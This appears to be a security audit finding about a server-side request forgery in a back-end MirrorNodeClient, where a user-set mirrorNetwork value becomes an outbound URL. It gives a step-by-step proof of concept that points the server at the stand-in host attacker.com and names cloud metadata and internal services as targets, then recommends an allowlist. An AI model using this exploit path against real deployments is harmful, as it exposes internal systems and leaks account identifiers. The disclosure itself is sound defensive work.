### Title
Server-Side Request Forgery (SSRF) via User-Controlled `mirrorNetwork` in Back-End `MirrorNodeClient`

### Summary
The back-end `MirrorNodeClient` service makes outbound HTTP requests to a URL derived from a user-supplied `mirrorNetwork` string stored in transaction records. When the `mirrorNetwork` value does not match a known network identifier, `MirrorNodeREST.fromBaseURL` constructs the target URL by blindly prepending `https://` to the raw user input. An authenticated user can submit a transaction with an attacker-controlled `mirrorNetwork` value, causing the back-end server to issue HTTP requests to arbitrary internal or external hosts on the attacker's behalf.

### Finding Description

**Root cause — unvalidated URL construction:**

`MirrorNodeREST.fromBaseURL` in `back-end/libs/common/src/utils/mirrorNode/index.ts` has a `default` branch that constructs a URL directly from the caller-supplied string with no allowlist or format validation:

```
default:
    return `https://${mirrorNetwork}`;
``` [1](#0-0) 

**Sink — server-side HTTP request:**

`MirrorNodeClient.getMirrorNodeRESTURL` calls `MirrorNodeREST.fromBaseURL(mirrorNetwork)` and the result is used directly as the base URL for outbound HTTP requests made by the NestJS server process:

```ts
private getMirrorNodeRESTURL(mirrorNetwork: string): string {
    return `${MirrorNodeREST.fromBaseURL(mirrorNetwork)}${this.endpointPrefix}`;
}
// ...
const response = await this.httpService.axiosRef.get<T>(url, { ... });
``` [2](#0-1) 

**Source — user-controlled `mirrorNetwork` in transaction payload:**

The front-end submits `mirrorNetwork` as part of the transaction creation request body. The value originates from the user-configurable network store, which accepts arbitrary custom mirror node URLs:

```ts
const { data } = await axiosWithCredentials.post(`${serverUrl}/${controller}`, {
    ...
    mirrorNetwork: network,
    ...
});
``` [3](#0-2) 

The custom network URL is set by the user in `NetworkSettings.vue` with no server-side allowlist enforcement: [4](#0-3) 

**End-to-end exploit path:**

1. Attacker (authenticated organization user) sets a custom mirror node URL to `attacker.com` in the front-end network settings.
2. Attacker creates and submits a transaction; the request body includes `mirrorNetwork: "attacker.com"`.
3. The back-end stores this value in the database alongside the transaction record.
4. When the back-end's chain/signature service processes the transaction (e.g., calling `fetchAccountInfo` or `fetchNodeInfo`), it passes the stored `mirrorNetwork` to `MirrorNodeClient`.
5. `MirrorNodeREST.fromBaseURL("attacker.com")` returns `"https://attacker.com"`.
6. The server issues `GET https://attacker.com/api/v1/accounts/{accountId}` — an outbound HTTP request from the back-end server to the attacker-controlled host.

The `node-cache.service.ts` confirms the server-side call path: [5](#0-4) 

### Impact Explanation

- **SSRF to internal network:** The back-end server can be made to probe internal hosts (e.g., `169.254.169.254` for cloud metadata, internal databases, Redis, RabbitMQ) that are not reachable from the public internet.
- **Data exfiltration via request path:** The server appends account IDs and node IDs to the attacker-controlled URL, leaking identifiers to the attacker's server in the HTTP request path.
- **Firewall bypass:** Requests originate from the trusted back-end server IP, bypassing network-level controls that block direct attacker access to internal services.

### Likelihood Explanation

Any authenticated organization user can trigger this without any privileged role. The attack requires only the ability to submit a transaction (a core, normal product workflow). No special tooling is needed beyond crafting a transaction with a custom `mirrorNetwork` value, which the front-end UI already supports natively.

### Recommendation

In `MirrorNodeREST.fromBaseURL` (and `MirrorNetworkGRPC.fromBaseURL`), replace the open `default` branch with an explicit allowlist check. If a custom network is required, validate the input against a strict URL allowlist or a configurable server-side allowlist before constructing the outbound URL. Reject or sanitize any `mirrorNetwork` value that does not match a known safe pattern at the API ingestion layer (DTO validation) before it is persisted to the database.

### Proof of Concept

1. Register as a normal user on an organization back-end instance.
2. In the front-end, navigate to **Settings → Network** and enter `attacker.com` as the custom mirror node base URL.
3. Create any transaction (e.g., a simple HBAR transfer) and submit it to the organization server. The POST body will contain `"mirrorNetwork": "attacker.com"`.
4. On the attacker-controlled server at `attacker.com`, observe an incoming HTTP GET request to `/api/v1/accounts/{accountId}` or `/api/v1/network/nodes?node.id=eq:{nodeId}` originating from the back-end server's IP address — confirming server-side request forgery.

    url: string,
    etag?: string,
  ): Promise<HttpResult<T>> {
    const headers: Record<string, string> = {};
    if (etag) {
      headers['If-None-Match'] = etag;
    }

    try {
      const response = await this.httpService.axiosRef.get<T>(url, {
        headers,
        validateStatus: (status) =>
          status === HTTP_STATUS.OK ||
          // only accept NOT_MODIFIED if we actually sent an ETag
          (etag != null && status === HTTP_STATUS.NOT_MODIFIED),
      });

      return {
        status: response.status,
        data: response.data,
        etag: response.headers?.etag,
      };
    } catch (error) {
      this.logger.error(`HTTP request failed for ${url}: ${error.message}`);
